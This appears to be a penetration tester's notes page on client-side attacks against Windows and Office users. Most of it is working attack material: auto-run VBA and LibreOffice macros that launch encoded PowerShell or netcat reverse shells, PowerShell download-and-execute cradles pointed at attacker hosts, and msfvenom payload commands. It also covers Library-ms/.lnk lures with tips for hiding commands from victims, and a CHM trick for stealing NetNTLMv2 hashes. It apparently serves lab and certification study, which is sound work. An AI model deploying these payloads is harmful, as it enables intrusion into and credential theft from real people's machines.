# Client-side attacks

{% hint style="info" %}
If a process dies or closes soon, migrate to another using `meterpreter > run post/windows/manage/migrate`
{% endhint %}

## [https://github.com/mgeeky/PackMyPayload](https://github.com/mgeeky/PackMyPayload)

## Client fingerprinting

[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)

[https://canarytokens.com/](https://canarytokens.com/)

## Office / OpenOffice / LibreOffice

### LibreOffice > Find version

```
LibreOffice\program\version.ini
soffice.exe --version
```

Bear in mind that older client-side attack vectors, including _Dynamic Data Exchange_ (DDE) and various _Object Linking and Embedding_ (OLE) methods do not work well today without significant target system modification.

{% embed url="https://www.hacking.reviews/2017/02/hack-remote-pc-with-apache-openoffice.html?m=1" %}

{% embed url="https://github.com/rmdavy/badodf/" %}

{% code overflow="wrap" fullWidth="true" %}
```bash
- Create a blank Word document and save it as mymacro.doc
- Open Macro section and create a New Macro, e.g. the name MyMacro // Important: in the Macros in dropdown select mymacro (Document)

# Other options for macro payload
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://$ATTACKER_IP/Inv-Pow.ps1')
```
{% endcode %}

Go to **Tools > Macros > Basic** and create a macro under the "document tree", add **Shell()** commands between **Sub X... End Sub** Then go to **Tools > Customize > Events** and select the macro to being executed under the event of **"Open Document".**

.doc, .docm, .xlsm , .odt, .ods and others are vulnerable formats

This is the general Microsoft Word Macro (.doc) approach:

{% hint style="info" %}
For newer Office file extensions such as .docm these modifications might be needed:

```
Dim objShell As Object
    
Set objShell = CreateObject("WScript.Shell")

objShell.Run Str
```
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```python
# Generate PS base64-encoded payload (careful with lport, choose one that is open on the target)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.0 LPORT=445 -f hta-psh -o file.hta
# Copy just the encoded part to paste it on the next script
grep -oP 'powershell.exe .*\"' file.hta | tr -d '"' | xclip -sel clip

# Python script to split Base64 encoded string
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
	
# Macro invoking PowerShell to create a reverse shell
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Dim objShell As Object
    
    Set objShell = CreateObject("WScript.Shell")
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "..."
    ...
    Str = Str + "QA="

    objShell.Run Str
    
End Sub


# OBJECT LINKING AND EMBEDDING
Leverage Object Linking and Embedding (OLE) to abuse Microsoft Office's document-embedding feature.
In this attack scenario, we are going to embed a Windows batch file inside a Microsoft Word document.
Object menu > Create from file > select script.bat, change display icon and name to Excel and readme.xls
# Inside .bat script something like this:
START powershell.exe -nop -w hidden -e FZc9jpB2... # last part is base64 command

# EVADING PROTECTED VIEW
Use the embedded object above on another Office app like Publisher that does not have Protected View for Internet documents.
```
{% endcode %}

### Alternative for VBA macros

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

### ODT / ODS

#### Malicious Macro Generator

[https://github.com/0bfxgh0st/MMG-LO](https://github.com/0bfxgh0st/MMG-LO)

Save file as **test.odt**:

Then we go to **Tools > Macros > Organize Macros... > Basic**:

There we go under our .odt file and create a new module:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

There we write our code as we saw on the Github example to download and execute Netcat on port 445 (we tried 443 and 80 before and did not work, 445 is a good port since it is common to find it internally open on Windows machines):

{% code overflow="wrap" fullWidth="true" %}
```vba
Sub OnLoad
	Shell("curl http://192.168.49.150:8000/nc.exe -o C:\Users\Public\Documents\nc.exe")
	Shell("C:\Users\Public\Documents\nc.exe 192.168.49.150 445 -e cmd.exe")
End Sub
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

We save the changes on the module and we close that window.

Now we have to enable the event to run this module when the document is open. We go to **Tools>Customize>Events** and then we go to Open **Document** and assign our macro:

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

We press OK and save the document.

### NTLM Credential Theft via malicious ODT Files

[https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/](https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/)

### Create macros on Linux

[https://github.com/X0RW3LL/Minitrue](https://github.com/X0RW3LL/Minitrue)

### MS-MSDT Follina

better this [https://github.com/chvancooten/follina.py](https://github.com/chvancooten/follina.py) than John Hammond's

[https://github.com/JohnHammond/msdt-follina](https://github.com/JohnHammond/msdt-follina)

{% hint style="info" %}
Code might be tweaked to host nc.exe on a different port.
{% endhint %}

## VBA/VBS

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.113.238 LPORT=445 -f vbs -o evil.vbs
```

## Windows Library Files

Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.

{% hint style="info" %}
Lesser known than macros but equally effective, useful when we do not know if Office is installed on the target.
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```xml
# 1 - Windows Library files to get foothold and set up 2nd stage /// 2 - provide executable file and start a revshell

# NOTE : Don’t start yet the wsgidav server , that way you DON’T open the config-Library.ms by accident

https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry and check Related topics
# On a Windows VM, open Visual Studio Code or Notepad and create an empty file with the name config.Library-ms
<?xml version="1.0" encoding="UTF-8"?> 
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> 
<name>@windows.storage.dll,-34582</name> 
<version>6</version> 
<isLibraryPinned>true</isLibraryPinned> 
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo> 
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> 
</templateInfo> 
<searchConnectorDescriptionList> 
<searchConnectorDescription> 
<isDefaultSaveLocation>true</isDefaultSaveLocation> 
<isSupported>false</isSupported> 
<simpleLocation> 
<url>http://$ATTACKER_IP</url> 
</simpleLocation> 
</searchConnectorDescription> 
</searchConnectorDescriptionList> 
</libraryDescription>
```
{% endcode %}

{% hint style="info" %}
DON’T double click the new file, else inside it will change, like leave it like that!
{% endhint %}





{% code overflow="wrap" fullWidth="true" %}
```bash
# Then create the shortcut file > right-click on the Desktop > New > Shortcut > Type the location of the item and write this
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ATTACKER_IP:8000/Inv-Pow.ps1')"
# Or Powercat
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"

- Transfer those files to our attacking machine inside /home/kali/webdav

# We set up WebDAV share. If error check https://peps.python.org/pep-0668/
pip3 install wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
# WebDAV running, confirm visiting localhost on browser

# To execute the attack
- Host config.Library-ms and link.lnk inside WebDAV folder and run WebDAV
- Start Python server on port 8000 to host Inv-Pow.ps1 or Powercat (if fails, move them to /home/kali/webdav as well)
- Start listener on Netcat on the desired port
- Find a way to upload config.Library-ms on the target (via FTP, SMB, upload form...)
- Wait a bit until attack is successful

# NOTE: to test the file created, we could click on config.Library-ms from the Windows VM Prep machine to see the files
# NOTE 1: use Python HTTP server to host powercat, WebDAV is worse idea since it is writable and Windows could delete our files/payloads.
# Then copy config.Library-ms and .lnk file to our attacking machine. Then upload the Win Library to the target via SMB/FTP or as an email attachment.
# NOTE 2: we have to convince the target to open Win Library and .lnk. For the .lnk command, it the targeted user is tech-savvy, we could use some benign commands and place the malicious one at the end when the cursor does not go and it cannot be seen easily.
```
{% endcode %}

## HTA

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript.

{% code overflow="wrap" fullWidth="true" %}
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload,
```
{% endcode %}

## CHM

{% code overflow="wrap" %}
```bash
# ********* .CHM REVERSE SHEL
https://rioasmara.com/2020/09/02/create-chm-for-reverse-shell-nishang/
Install https://archive.org/details/htmlhelp on Windows VM
https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1
PS C:\Users\commando\Downloads\repos\nishang\Client > Import-Module .\Out-CHM.ps1
COMMANDO 5/14/2023 3:02:36 PM
PS C:\Users\commando\Downloads\repos\nishang\Client > Out-CHM -PayloadURL http://10.10.0.0/rev.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
Microsoft HTML Help Compiler 4.74.8702

# ********* .CHM innocent file
In order to exploit this, we can create a new CHM ﬁle containing a UNC link, that will trigger a connection to our server on opening. This will allow us to steal the admins NetNTLMv2 hashes. Consider the following HTML code.
<html> 
<body> 
<img src=\\10.10.14.3\share\abc.png /> 
</body> 
</html>

Save the file as file.html. Then, having dowloaded HTML Help Workshop, let's run hhp.exe or htmlhelp.exe, create a new project, existing files, tick .htm files, add ours and then compile it to have a .chm file.
Then upload that file and if use responder to catch NetNTLMv2 hashes when a user opens the file on the target.
```
{% endcode %}

## Crack Word/Excel/Office files

```bash
office2john file.docx > hashes
```

## Windows Scripting Host - WSH

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe.

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/cym13/vbs-reverse-shell
# Content of payload.vbs
Set shell = WScript.CreateObject("Wscript.Shell")

shell.Run("C:\Windows\Temp\nc.exe 10.10.10.10 4444 -e cmd " & WScript.ScriptFullName),0,True

c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
# If VBS files are blacklisted, rename it as .txt and run it using wscript
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```
{% endcode %}

## Client fingerprinting

Web browsers are generally a good vector for collecting information on the OS target. Their evolution, complexity, and richness in functionality has become a double-edged sword for both end users and attackers.

```
sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
```
